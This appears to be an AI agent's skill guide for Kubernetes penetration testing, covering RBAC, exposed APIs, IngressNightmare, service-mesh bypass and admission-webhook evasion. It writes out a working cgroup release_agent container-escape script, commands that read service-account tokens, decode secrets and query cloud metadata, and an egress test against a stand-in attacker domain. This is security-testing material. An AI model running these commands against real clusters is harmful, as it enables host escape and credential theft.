---
name: kubernetes
description: Kubernetes cluster security testing - RBAC, API exposure, container escapes, network policies, secrets, supply chain, ingress-nginx admission-controller RCE (IngressNightmare CVE-2025-1974), service mesh sidecar bypass, and admission-webhook evasion
---

# Kubernetes Security Testing

Kubernetes clusters expose a large attack surface through their API server, kubelet, etcd, and workload configurations. Misconfigurations in RBAC, network policies, and container security contexts are common and frequently lead to privilege escalation, lateral movement, and cluster takeover. This skill covers direct cluster access scenarios. For SSRF-mediated Kubernetes access, see the ssrf skill.

## Attack Surface

**Scope**
- Kubernetes API server (typically port 6443 or 443)
- Kubelet API (port 10250 authenticated, port 10255 deprecated read-only)
- etcd (port 2379/2380, stores all cluster state including secrets)
- Cloud provider metadata endpoints reachable from pods
- Container runtimes (containerd, CRI-O) via socket access
- Service mesh sidecars and ingress controllers

**Entry Points**
- Exposed API server with weak or anonymous authentication
- Compromised pod with mounted service account token
- CI/CD runner with cluster credentials (kubeconfig files, IRSA tokens)
- Exposed management UIs (Kubernetes Dashboard, Rancher, ArgoCD)
- Node-level access via SSH, cloud instance metadata, or container escape

**Authentication Methods**
- Service account tokens (mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`)
- Client certificates (kubeconfig files, often found in CI/CD configs, home dirs, cloud storage)
- OIDC tokens, webhook tokens, cloud provider IAM-to-K8s mappings (EKS IRSA, GKE Workload Identity)
- Anonymous access (enabled by default; unauthenticated requests become `system:anonymous` / `system:unauthenticated`, with only explicitly bound RBAC permissions such as public discovery/info roles)

## Key Vulnerabilities

### RBAC Misconfigurations

- Wildcard verbs or resources in ClusterRole/Role bindings: `verbs: ["*"]`, `resources: ["*"]`
- `cluster-admin` bound to service accounts that don't need it
- Pods running with `automountServiceAccountToken: true` (the default) when no API access is needed
- `system:anonymous` or `system:unauthenticated` group bound to permissive roles
- Roles that grant `escalate`, `bind`, or `impersonate` verbs

**Test:**
```
kubectl auth can-i --list
kubectl auth can-i create pods --as=system:serviceaccount:default:default
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[]?.name == "system:anonymous")'
```

### Exposed APIs

- API server with `--anonymous-auth=true` and permissive RBAC for anonymous users
- Kubelet read-only port 10255 serving `/pods`, `/spec`, `/stats`
- etcd without client certificate authentication: `etcdctl get / --prefix --keys-only`
- Kubernetes Dashboard with skip-login or default token
- Metrics endpoints (`/metrics`, `/debug/pprof`) leaking internal state

**Test:**
```
curl -sk https://<api-server>:6443/api/v1/namespaces
curl -s http://<node-ip>:10255/pods
curl -s http://<node-ip>:10255/metrics
```

### Ingress-NGINX Admission Controller (IngressNightmare)

IngressNightmare (CVE-2025-1974, CVSS 9.8) is unauthenticated RCE in the
**ingress-nginx** controller's Validating Admission Controller, disclosed by Wiz
in March 2025. It matters because the admission webhook is an *unauthenticated*
HTTP endpoint on the pod network and the controller ServiceAccount by default
holds **cluster-wide `secrets` read** — so anything that can reach the webhook
(any pod, or the internet if it is exposed) reaches cluster takeover, with no
RBAC to create Ingress objects required.

- **Affected:** ingress-nginx-controller `< 1.11.5` and `1.12.0`. **Fixed:**
  `1.11.5` and `1.12.1`. Fingerprint the version before asserting exposure:
  ```
  kubectl -n ingress-nginx get deploy ingress-nginx-controller \
    -o jsonpath='{.spec.template.spec.containers[0].image}'   # image tag = controller version
  ```
- **Primitive (verified against the Wiz disclosure and the Kubernetes advisory).**
  The controller validates candidate configs by writing them to a temp file and
  running `nginx -t`. Several annotation parsers fail to sanitize input, so an
  attacker-supplied value injects raw nginx directives into that config. The
  injected `ssl_engine` directive (legal anywhere in the file, unlike
  `load_module`) loads an arbitrary shared object during the `-t` test. The
  attacker plants the `.so` by abusing nginx client-body buffering — a request
  body over the buffer threshold is written to disk and the fd survives the
  unlink under `/proc/<pid>/fd/<n>` — then references it from the injected
  directive → code execution in the controller pod.
- **Injectable annotations:** `auth-url` (CVE-2025-24514; not affected on 1.12.0,
  which added strict annotation-value regex), `auth-tls-match-cn`
  (CVE-2025-1097), and the mirror UID field (CVE-2025-1098); CVE-2025-24513 is a
  companion path-handling issue. CVE-2025-1974 is the piece that makes reaching
  the webhook *unauthenticated*.
- **Testing posture.** The high-value check is reachability + version, not firing
  the exploit. Confirm the `ingress-nginx-controller-admission` Service (fronts
  the webhook; controller listens on container port `8443`) is reachable from
  your pod network and that the build is vulnerable. The exact `AdmissionReview`
  JSON and directive payload live in the ingress-nginx GHSA / Wiz PoC — do not
  hand-craft config bytes blind: a mistuned config that still passes `nginx -t`
  can disrupt live ingress.
- **Remediation:** upgrade to 1.11.5 / 1.12.1+; NetworkPolicy the controller
  namespace so only the API server can reach the webhook; scope down the
  controller SA's cluster-wide secret access where the deployment allows.

### Container Escapes

- `privileged: true` in securityContext grants all Linux capabilities and device access
- `hostPID: true` enables `/proc` access to host processes, `nsenter` to host namespace
- `hostNetwork: true` places the pod on the host network stack
- Mounted Docker/containerd socket (`/var/run/docker.sock`, `/run/containerd/containerd.sock`)
- `CAP_SYS_ADMIN` + unconfined AppArmor enables mount namespace escapes via cgroup release_agent
- Writable `hostPath` mounts to `/`, `/etc`, or `/var/run`

**Test:**
```
# Check if running privileged
cat /proc/1/status | grep -i cap
# List host processes via hostPID
ls /proc/*/cmdline 2>/dev/null | head -20
# Check for mounted sockets
ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
# cgroup v1 release_agent escape (privileged + CAP_SYS_ADMIN)
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/exploit.sh" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit.sh && echo "ps aux > $host_path/out" >> /exploit.sh && chmod +x /exploit.sh
sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs'
```

### Network Policy Gaps

- No NetworkPolicy objects means all pod-to-pod traffic is allowed by default
- Egress policies missing, allowing pods to reach cloud metadata, external C2, or internal services
- Policies that select by namespace label but don't account for label-squatting
- DNS (port 53 UDP/TCP) often exempted from egress rules, enabling DNS tunneling

**Test:**
```
kubectl get networkpolicies --all-namespaces
# From inside a pod, test lateral reach
curl -s http://<other-pod-ip>:<port>/
curl -s http://169.254.169.254/latest/meta-data/
nslookup attacker.com
```

### Service Mesh Sidecar Bypass

When Istio (or Linkerd) injects a sidecar, the mesh's security guarantees live in
the proxy — unwrap or skip it and the policy is gone:
- **Envoy admin on 15000** — the `istio-proxy` sidecar exposes the Envoy admin
  interface on `localhost:15000`. From inside the pod (or any container sharing
  its network namespace), `curl localhost:15000/config_dump` leaks routes,
  clusters, and SDS secret references; `/certs` dumps the workload's mTLS certs;
  `/clusters` and `/server_info` map the mesh. `15020` (agent) and `15090`
  (Prometheus) leak too.
- **mTLS PERMISSIVE** — a `PeerAuthentication` in `PERMISSIVE` mode accepts both
  mTLS and plaintext, so reaching the pod IP directly on the app port bypasses
  mesh identity entirely. Check for `mtls: mode: PERMISSIVE` (the migration
  default).
- **AuthorizationPolicy bypass** — policies keyed on HTTP path are subject to
  normalization differentials (`//`, `/./`, `%2e`, trailing slash, case) between
  Envoy's matcher and the upstream app; load `path_traversal_lfi_rfi` for the
  normalization table. And `X-Forwarded-Client-Cert` (XFCC) carries mesh
  identity — if the gateway does not strip a client-supplied XFCC header, you can
  spoof a peer identity.
- **Skipping the sidecar** — only traffic redirected by the init iptables rules
  (outbound `15001`, inbound `15006`) is mediated. Traffic in the window before
  the proxy is ready (`holdApplicationUntilProxyStarts=false`) or on ports
  excluded via `traffic.sidecar.istio.io/excludeInboundPorts` is unauthenticated
  and unmeshed.

### Secret Management Issues

- Secrets stored as base64 in etcd (not encrypted at rest by default)
- Secrets injected via environment variables (visible in `/proc/*/environ`, `docker inspect`, crash dumps)
- ConfigMaps containing credentials, API keys, connection strings
- Service account tokens auto-mounted into pods that never call the API
- Helm release secrets containing full chart values with credentials
- Secrets Store CSI Driver: a `SecretProviderClass` with `secretObjects` enabled syncs external-vault secrets (Vault/AWS/GCP/Azure) back into a native K8s Secret — re-exposing them to anyone with `get secret` in the namespace and defeating the point of external storage. The CSI driver's own SA / cloud identity is itself a pivot into the external secret store

**Test:**
```
kubectl get secrets --all-namespaces -o json | jq '.items[].metadata.name'
kubectl get secret <name> -o json | jq '.data | map_values(@base64d)'
env | grep -iE 'password|key|token|secret|credential'
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Workload Misconfigurations

- Containers running as root (`runAsUser: 0` or no securityContext set)
- Missing `readOnlyRootFilesystem: true`
- No resource limits (enables resource exhaustion attacks, noisy neighbor DoS)
- `allowPrivilegeEscalation: true` (the default)
- Missing `seccompProfile` or AppArmor annotations

**Test:**
```
kubectl get pods -o json | jq '.items[].spec.containers[].securityContext'
kubectl get pods -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true) | .metadata.name'
```

### Supply Chain Risks

- Images pulled from public registries without digest pinning (`:latest` tag is mutable)
- No image signing or admission policy (Kyverno, OPA Gatekeeper, Sigstore)
- Init containers or sidecar injectors pulling untrusted images
- Helm charts from unverified repos with post-install hooks
- CI/CD pipelines with broad cluster access and no image scanning

**Test:**
```
kubectl get pods -o json | jq '.items[].spec.containers[].image' | grep -v '@sha256'
kubectl get pods -o json | jq '.items[].spec.containers[].image' | grep ':latest'
```

## Bypass Techniques

**Token Reuse**
- Service account tokens from one pod can access any API object the SA has permissions for
- Tokens from CI/CD systems often have broad access (deploy, create, delete)
- Expired tokens may still work if token verification is misconfigured

**Label Manipulation**
- If RBAC or NetworkPolicy selects by label, and attacker can set labels on their pod, they can bypass restrictions
- Namespace labels used for admission control can be manipulated if attacker has `update` on namespaces

**Admission Webhook Bypass**
- Dry-run requests bypass mutating webhooks
- Some webhooks only check specific API groups, leaving others unprotected
- Webhook failures configured as `failurePolicy: Ignore` silently bypass validation
- `failurePolicy: Ignore` as a *DoS-to-bypass*: overwhelm or crash the webhook backend so calls exceed `timeoutSeconds` (10s default) — the API server then admits objects unchecked, turning availability into a policy bypass
- `namespaceSelector`/`objectSelector` exclusions: if the webhook skips a namespace or a label (a `control-plane` namespace, a `webhook: ignore` label) and you can create in it or set that label on your object, you dodge the webhook entirely
- Narrow `rules` and `matchConditions`: create via an `apiVersion`, `operation`, `scope`, or subresource the rule doesn't match (e.g. `pods/exec` when the rule only covers `pods` CREATE)
- ValidatingAdmissionPolicy (in-tree CEL) runs in-process, so it has no webhook-timeout/network path — don't assume the webhook bypasses above defeat a VAP-based control

**Kubelet Direct Access**
- The kubelet API on port 10250 accepts commands independently from the API server
- If you can reach a node's kubelet, you can exec into any pod on that node
- Anonymous kubelet access: `curl -sk https://<node>:10250/runningpods/`

## Testing Methodology

1. **Enumerate access** - Determine current auth context: `kubectl auth whoami`, `kubectl auth can-i --list`
2. **Map the cluster** - List namespaces, pods, services, nodes, and their labels: `kubectl get all -A`
3. **Check RBAC** - Review ClusterRoleBindings and RoleBindings for overly permissive grants
4. **Probe APIs** - Test API server, kubelet, etcd, and dashboard reachability from your context
5. **Inspect workloads** - Check securityContext, hostPID/hostNetwork, volume mounts, and image tags
6. **Test network reach** - From compromised pod, probe other pods, services, metadata endpoints, and external hosts
7. **Extract secrets** - Enumerate secrets, env vars, mounted tokens, and Helm release values
8. **Escalate** - Chain findings: SA token + permissive RBAC -> create privileged pod -> node access -> cluster-admin
9. **Benchmark** - Run `kube-bench` for CIS compliance, `kubesec` for workload hardening scores, `trivy` for image CVEs

## Validation

1. Prove access to resources beyond intended scope (cross-namespace secret read, exec into another team's pod)
2. Demonstrate privilege escalation path from initial access to elevated permissions (SA token -> cluster-admin)
3. Show actual credential extraction (token, kubeconfig) and verify it grants claimed access level
4. For container escapes, demonstrate host filesystem read or host process visibility without destructive actions
5. Confirm NetworkPolicy gaps by showing successful cross-namespace or metadata endpoint connections

## False Positives

- `kubectl auth can-i` returning `yes` for service accounts that are restricted by admission controllers or OPA policies
- Kubelet port 10250 reachable but returning 401/403 (authentication is working correctly)
- NetworkPolicy absent in a namespace that uses a CNI with default-deny (Calico GlobalNetworkPolicy)
- Service account tokens mounted but unused, with admission controllers preventing their abuse
- Images using `:latest` tag but pulled from a private registry with immutable tags enabled

## Impact

- Full cluster compromise from a single misconfigured RBAC binding or service account
- Lateral movement across namespaces and workloads via pod-to-pod communication
- Cloud account compromise via metadata endpoint access from pods (AWS keys, GCP tokens, Azure MSI)
- Supply chain attacks via compromised base images or Helm chart hooks
- Data exfiltration from secrets, ConfigMaps, and persistent volumes
- Denial of service through resource exhaustion in clusters without resource quotas

## Pro Tips

1. Start with `kubectl auth can-i --list` to understand your blast radius before probing anything
2. Service account tokens in `/var/run/secrets/` are your first pivot point from any compromised pod
3. Test metadata endpoint access early - cloud credentials from pods are the fastest path to cluster-admin
4. Check for `kube-system` namespace access - controllers there often have cluster-admin equivalent permissions
5. `kube-bench` output is noisy but highlights the CIS benchmark failures that matter most
6. Container escapes via cgroup release_agent require `CAP_SYS_ADMIN` (via `privileged: true` or an explicit capability grant) plus permissive AppArmor/seccomp confinement
7. Helm release secrets (`sh.helm.release.v1.*`) in `kube-system` often contain credentials from chart values
8. DNS from inside a pod reveals service names: `dig +short SRV *.*.svc.cluster.local`
9. When testing RBAC, try `--as=` impersonation to check what other service accounts can do

## Summary

Kubernetes security failures typically chain: a single misconfigured role binding or missing network policy enables lateral movement, which leads to secret extraction, which leads to cloud credential access. Test the chain, not just individual findings. Start from the auth context you have, enumerate what it can reach, and escalate methodically.
